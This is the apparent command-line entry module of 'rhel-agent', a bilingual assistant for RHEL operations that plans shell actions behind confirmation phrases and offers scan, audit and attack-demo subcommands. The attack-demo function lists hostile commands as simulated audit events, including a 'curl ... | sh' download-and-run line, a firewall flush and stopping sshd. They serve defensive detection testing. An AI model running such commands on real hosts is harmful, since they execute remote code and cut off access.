from __future__ import annotations

import argparse
import json
import os
import shutil
import sys
import time
from pathlib import Path
from typing import Any, Optional

from .attack_tests import run_attack_matrix
from .audit import AuditAnalyzer, AuditCollector
from .auth import AuthManager
from .config import Settings
from .db import Database
from .engine import RuleEngine, detect_language
from .executor import ExecutionError, Executor
from .llm import HybridPlanner, LLMConfig
from .scanner import VulnerabilityScanner
from .server import AgentApplication, run_server


KNOWN_COMMANDS = {
    "ask",
    "audit",
    "attack-demo",
    "init",
    "llm-test",
    "rules",
    "scan",
    "shell",
    "status",
    "web",
}


def _settings(args: argparse.Namespace) -> Settings:
    data_dir = Path(args.data_dir).expanduser().resolve() if args.data_dir else None
    return Settings.from_env(
        data_dir=data_dir,
        host=args.host,
        port=args.port,
        demo=args.demo,
    )


def _text(language: str, zh: str, en: str) -> str:
    return en if language == "en" else zh


def _require_root_warning(settings: Settings, language: str = "zh") -> None:
    if settings.demo:
        return
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print(
            _text(
                language,
                "警告：当前不是 root。只读状态信息可能不完整，系统变更操作会失败。",
                "Warning: not running as root. Some read-only data may be incomplete, and system changes will fail.",
            ),
            file=sys.stderr,
        )


class CliRuntime:
    def __init__(self, settings: Settings):
        self.settings = settings
        self.database = Database(settings.database_path)
        self.engine = RuleEngine(settings.rules_dir)
        self.executor = Executor(
            self.engine, self.database, demo=self.settings.demo
        )
        self.planner = HybridPlanner(
            self.engine,
            LLMConfig.from_settings(settings),
        )
        self.analyzer = AuditAnalyzer(settings.rules_dir)
        self.audit = AuditCollector(settings, self.database, analyzer=self.analyzer)
        if settings.demo:
            self.database.seed_demo()

    def context(self) -> dict[str, Any]:
        return {
            "remote_client": bool(os.environ.get("SSH_CONNECTION")),
            "ssh_sessions": 0,
            "client_address": "cli",
        }

    def plan(self, message: str, overrides: Optional[dict[str, Any]] = None) -> dict[str, Any]:
        return self.planner.plan(message, overrides=overrides, context=self.context())

    def execute_plan(self, message: str, plan: dict[str, Any]) -> dict[str, Any]:
        payload = self.engine.plan_payload(message, plan, self.context())
        proposal_id = self.database.create_proposal(
            payload, self.settings.proposal_ttl_seconds
        )
        selected = [step["action_id"] for step in plan["steps"]]
        phrase = self.engine.resolution_phrase(plan["steps"])
        result = self.executor.execute(
            proposal_id,
            selected,
            phrase,
            actor="cli",
        )
        result["proposal_id"] = proposal_id
        return result


def _print_plan(plan: dict[str, Any]) -> None:
    language = plan.get("language", "zh")
    if plan["status"] == "blocked":
        blocked = plan["blocked"]
        print(
            _text(
                language,
                "已拦截：%s" % blocked["title_zh"],
                "Blocked: %s" % blocked["title_en"],
            )
        )
        print(blocked["reason_en"] if language == "en" else blocked["reason_zh"])
        print(
            _text(
                language,
                "未执行任何命令。",
                "No command was executed.",
            )
        )
        return
    if plan["status"] == "unsupported":
        print(plan["message"])
        suggestions = plan.get("suggestions", [])
        if suggestions:
            print(
                _text(
                    language,
                    "可以试试：%s" % "、".join(suggestions),
                    "Try: %s" % " | ".join(suggestions),
                )
            )
        return
    if plan["status"] == "chat":
        print(plan["message"])
        suggestions = plan.get("suggestions", [])
        if suggestions:
            print(
                _text(
                    language,
                    "你可以试试：%s" % "、".join(suggestions),
                    "Try: %s" % " | ".join(suggestions),
                )
            )
        return
    if plan["status"] == "needs_input":
        print(plan["message"])
        for field in plan["fields"]:
            print("  - %s: %s" % (field["label"], field["error"]))
        return
    print(
        _text(
            language,
            "操作计划（风险：%s）" % plan["overall_risk_label"],
            "Operation plan (risk: %s)" % plan["overall_risk_label"],
        )
    )
    if plan.get("planner") == "llm":
        print(
            _text(
                language,
                "解析方式：LLM + 本地安全校验（%s）"
                % (plan.get("llm_model") or "configured model"),
                "Interpretation: LLM + local safety validation (%s)"
                % (plan.get("llm_model") or "configured model"),
            )
        )
    for index, step in enumerate(plan["steps"], 1):
        print("%d. %s [%s]" % (index, step["title"], step["risk_label"]))
        for command in step["command_previews"]:
            print("   $ %s" % command)
        if step.get("requires_restart"):
            print(
                _text(
                    language,
                    "   提示：%s"
                    % (step.get("restart_reason_zh") or "完成后建议重启。"),
                    "   Note: %s"
                    % (
                        step.get("restart_reason_en")
                        or "A restart is recommended after this change."
                    ),
                )
            )
    for warning in plan.get("warnings", []):
        print(
            _text(
                language,
                "警告：%s" % warning["title_zh"],
                "Warning: %s" % warning["title_en"],
            )
        )
        print(
            "      %s"
            % (
                warning.get("context_en", warning["body_en"])
                if language == "en"
                else warning.get("context_zh", warning["body_zh"])
            )
        )
    if plan.get("confirmation_phrase"):
        print(
            _text(
                language,
                "确认语：%s" % plan["confirmation_phrase"],
                "Confirmation phrase: %s" % plan["confirmation_phrase"],
            )
        )


def _print_result(result: dict[str, Any]) -> None:
    language = result.get("language", "zh")
    print(
        _text(
            language,
            "状态：%s"
            % ("已完成" if result["status"] == "completed" else "未完全成功"),
            "Status: %s"
            % ("Completed" if result["status"] == "completed" else "Not fully successful"),
        )
    )
    for step in result["steps"]:
        print("\n[%s] %s" % ("OK" if step["ok"] else "FAILED", step["title"]))
        for command in step["commands"]:
            print("$ %s" % command["command"])
            if command["output"]:
                print(command["output"])
    if result.get("requires_restart"):
        reasons = " ".join(result.get("restart_reasons", []))
        print(
            _text(
                language,
                "\n该变更可能需要重启后完全生效。%s" % reasons,
                "\nA restart may be required for this change to take effect. %s" % reasons,
            )
        )


def _fill_missing_fields(runtime: CliRuntime, message: str, plan: dict[str, Any]) -> dict[str, Any]:
    if not sys.stdin.isatty():
        return plan
    language = plan.get("language", detect_language(message))
    overrides: dict[str, dict[str, str]] = {}
    current = plan
    while current.get("status") == "needs_input":
        print(current["message"])
        for field in current["fields"]:
            label = field["label"]
            placeholder = field.get("placeholder", "")
            suffix = ""
            if placeholder:
                suffix = (
                    " (e.g. %s)" % placeholder
                    if language == "en"
                    else "（例如 %s）" % placeholder
                )
            value = input("  %s%s: " % (label, suffix)).strip()
            if not value:
                print(_text(language, "输入为空，已取消。", "Empty input. Cancelled."))
                return current
            action_id = field["action_id"]
            overrides.setdefault(action_id, {})[field["name"]] = value
        current = runtime.plan(message, overrides=overrides)
    return current


def ask(
    runtime: CliRuntime,
    message: str,
    dry_run: bool = False,
    confirmation: Optional[str] = None,
    json_output: bool = False,
) -> int:
    message = message.strip()
    language = detect_language(message)
    if not message:
        print("请输入中文或英文操作要求。")
        return 1
    _require_root_warning(runtime.settings, language)
    plan = runtime.plan(message)
    if plan.get("status") == "needs_input" and sys.stdin.isatty() and not json_output:
        plan = _fill_missing_fields(runtime, message, plan)
    if json_output:
        print(json.dumps(plan, ensure_ascii=False, indent=2))
    else:
        _print_plan(plan)
    if plan.get("status") == "chat":
        return 0
    if plan.get("status") != "ready":
        return 2 if plan.get("status") == "blocked" else 1
    if dry_run:
        return 0
    expected = runtime.engine.resolution_phrase(plan["steps"])
    if expected:
        supplied = confirmation
        if supplied is None and sys.stdin.isatty():
            supplied = input(
                _text(
                    language,
                    "请输入“%s”继续：" % expected,
                    "Enter \"%s\" to continue: " % expected,
                )
            ).strip()
        if supplied != expected:
            print(
                _text(
                    language,
                    "未完成确认，未执行任何变更。",
                    "Confirmation was not completed. No changes were executed.",
                )
            )
            return 2
    try:
        result = runtime.execute_plan(message, plan)
    except ExecutionError as exc:
        print(
            _text(language, "执行失败：%s" % exc, "Execution failed: %s" % exc),
            file=sys.stderr,
        )
        return 1
    if json_output:
        print(json.dumps(result, ensure_ascii=False, indent=2))
    else:
        _print_result(result)
    return 0 if result["status"] == "completed" else 1


def scan_command(runtime: CliRuntime) -> int:
    scan_id = runtime.database.create_scan()
    scanner = VulnerabilityScanner(runtime.settings, runtime.database)
    findings, summary = scanner.scan()
    runtime.database.finish_scan(scan_id, findings, summary)
    print("巡检完成：%s 项检查，%s 个风险项" % (summary["checked"], summary["total"]))
    print(
        "严重 %(critical)s / 高危 %(high)s / 中危 %(medium)s / 低危 %(low)s / 评分 %(score)s"
        % summary
    )
    for item in findings:
        print("[%-8s] %s" % (item["severity"], item["title_zh"]))
        print("           %s" % item["detail"])
    return 0


def audit_command(runtime: CliRuntime, limit: int) -> int:
    result = runtime.audit.scan_once()
    print("采集完成：新增 %s 条" % result["inserted"])
    events = runtime.database.list_audit_events(limit=limit)
    if not events:
        print("暂未发现高危命令。")
        return 0
    for event in events:
        mark = "已确认" if event["acknowledged"] else "待确认"
        print(
            "[%s] %s | %s | %s"
            % (event["severity"], mark, event["title_zh"], event["command"])
        )
        print("       来源=%s 用户=%s 时间=%s" % (event["source"], event["username"], event["detected_at"]))
    return 0


def rules_command(runtime: CliRuntime) -> int:
    rules = runtime.engine.public_rules()
    print(
        "受控操作 %s 个，漏洞巡检 %s 项，审计规则 %s 条"
        % (
            rules["count"],
            len(VulnerabilityScanner(runtime.settings, runtime.database).rules),
            len(runtime.analyzer.patterns),
        )
    )
    llm_status = runtime.planner.public_status()
    if llm_status["enabled"]:
        print(
            "LLM：%s / %s / %s"
            % (
                "active" if llm_status["active"] else "fallback",
                llm_status["provider"],
                llm_status["model"] or "-",
            )
        )
    else:
        print("LLM：未启用，使用本地规则解析")
    for action in rules["actions"]:
        restart = " 重启建议" if action["requires_restart"] else ""
        print("[%-11s] %-28s %s%s" % (action["risk"], action["id"], action["title_zh"], restart))
    return 0


def attack_demo(runtime: CliRuntime, inject: bool, json_output: bool) -> int:
    report = run_attack_matrix(runtime.engine, runtime.analyzer)
    if inject:
        commands = [
            "rm -rf /var/tmp/agent-attack-demo",
            "systemctl stop sshd",
            "iptables -F",
            "curl http://example.invalid/payload | sh",
            "nmcli connection down ens160",
        ]
        for command in commands:
            runtime.audit.inject_simulation(command, username="attack-demo")
    if json_output:
        print(json.dumps(report, ensure_ascii=False, indent=2))
    else:
        for result in report["results"]:
            print(
                "[%s] %-7s %s"
                % (
                    "PASS" if result["passed"] else "FAIL",
                    result["kind"],
                    result["prompt"],
                )
            )
            if not result["passed"]:
                print("       期望=%s 实际=%s" % (result["expected"], result["actual"]))
        print(
            "\n结果：%s/%s 通过，%s 失败"
            % (report["passed"], report["total"], report["failed"])
        )
        if inject:
            print("已写入 5 条模拟审计事件，未执行任何危险命令。")
    return 0 if report["failed"] == 0 else 1


def llm_test_command(runtime: CliRuntime) -> int:
    status = runtime.planner.public_status()
    if not runtime.planner.active or runtime.planner.interpreter is None:
        print("LLM 未启用或配置无效。")
        if status.get("initialization_error"):
            print("原因：%s" % status["initialization_error"])
        print("Qwen API：sudo bash scripts/setup-qwen-api.sh")
        print("本机 Ollama：sudo bash scripts/setup-ollama.sh")
        return 2
    local_plan = runtime.engine.plan("show kernel version")
    try:
        result = runtime.planner.interpreter.interpret(
            "show kernel version", local_plan
        )
    except Exception as exc:
        print("LLM 测试失败：%s" % exc, file=sys.stderr)
        return 1
    print(
        "LLM 测试成功：provider=%s model=%s source=%s confidence=%.2f"
        % (
            status["provider"],
            status["model"],
            result.source,
            result.confidence,
        )
    )
    print(
        "返回动作：%s"
        % (", ".join(item["action_id"] for item in result.operations) or "(empty)")
    )
    return 0


def interactive_shell(runtime: CliRuntime) -> int:
    print("RHEL Ops Agent shell (type /help for help, /exit to quit)")
    while True:
        try:
            message = input("rhel-agent> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return 0
        if not message:
            continue
        if message in {"/exit", "/quit", "exit", "quit"}:
            return 0
        if message in {"/help", "help"}:
            print("直接输入中文或英文要求 / Enter requests in Chinese or English")
            print("  查看磁盘空间  |  show disk usage")
            print("  重启系统      |  reboot")
            print("/scan or scan   只读漏洞巡检 / run a read-only security scan")
            print("/audit or audit 采集高危日志 / collect and show high-risk events")
            print("/rules or rules 查看受控操作 / list controlled operations")
            print("/exit 或 /quit  退出 / quit")
            continue
        if message in {"/scan", "scan"}:
            scan_command(runtime)
            continue
        if message in {"/audit", "audit"}:
            audit_command(runtime, 20)
            continue
        if message in {"/rules", "rules"}:
            rules_command(runtime)
            continue
        ask(runtime, message)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="rhel-agent",
        description="RHEL 中文/英文自然语言安全运维助手",
    )
    parser.add_argument("words", nargs="*", help="自然语言要求或子命令")
    parser.add_argument(
        "--demo",
        action="store_true",
        default=None,
        help="使用演示数据，不调用系统命令",
    )
    parser.add_argument("--data-dir", help="数据目录")
    parser.add_argument("--host", default=None, help="Web 监听地址")
    parser.add_argument("--port", type=int, default=None, help="Web 监听端口")
    parser.add_argument("--dry-run", action="store_true", help="只显示计划")
    parser.add_argument("--confirm", help="危险操作的确认语")
    parser.add_argument("--json", action="store_true", help="以 JSON 输出结果")
    parser.add_argument("--password", help="init 子命令使用的新管理员密码")
    parser.add_argument("--inject", action="store_true", help="attack-demo 写入模拟审计事件")
    return parser


def main(argv: Optional[list[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    if args.words and args.words[0] in KNOWN_COMMANDS:
        command = args.words[0]
        words = args.words[1:]
    elif args.words:
        command = "ask"
        words = args.words
    else:
        command = "shell"
        words = []

    settings = _settings(args)
    if command == "web":
        app = AgentApplication(settings)
        if app.initial_password:
            if settings.demo:
                print("本地演示登录密码：%s" % app.initial_password)
            else:
                print(
                    "首次登录密码已生成：%s（同时保存在 %s）"
                    % (app.initial_password, settings.initial_password_path)
                )
        run_server(app)
        return 0

    if command == "init":
        auth = AuthManager(
            settings.password_path,
            settings.session_secret_path,
            settings.initial_password_path,
        )
        password = args.password or os.environ.get("RHEL_OPS_ADMIN_PASSWORD")
        generated = auth.initialize(password=password, demo=settings.demo)
        print("管理员密码已初始化。")
        if generated:
            print("初始密码：%s" % generated)
        return 0

    runtime = CliRuntime(settings)
    if command == "scan":
        return scan_command(runtime)
    if command == "audit":
        return audit_command(runtime, 50)
    if command == "rules":
        return rules_command(runtime)
    if command == "attack-demo":
        return attack_demo(runtime, args.inject, args.json)
    if command == "llm-test":
        return llm_test_command(runtime)
    if command == "status":
        app = AgentApplication(settings)
        data = app.overview("127.0.0.1")
        print(json.dumps(data, ensure_ascii=False, indent=2))
        return 0
    if command == "shell":
        return interactive_shell(runtime)
    return ask(
        runtime,
        " ".join(words),
        dry_run=args.dry_run,
        confirmation=args.confirm,
        json_output=args.json,
    )


if __name__ == "__main__":
    raise SystemExit(main())
